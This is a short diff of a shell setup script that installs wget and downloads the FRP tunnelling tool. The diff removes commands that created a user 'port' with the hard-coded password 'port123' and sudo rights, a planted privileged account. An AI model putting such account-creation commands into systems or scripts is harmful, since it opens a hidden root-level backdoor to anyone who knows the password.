@@ -12,14 +12,6 @@ cd .pt
 echo "[*] Preparing environment and installing wget..."
 apt-get update -y && apt-get install -y wget
 
-useradd -m -d /.pt/port -s /bin/bash port
-
-# Set the sh to "pt"
-echo 'port:port123' | chpasswd
-
-# Give the user sudo privileges (Ubuntu/Debian)
-usermod -aG sudo port
-
 echo "[*] Downloading FRP v0.61.1..."
 wget https://github.com/fatedier/frp/releases/download/v0.61.1/frp_0.61.1_linux_amd64.tar.gz
 
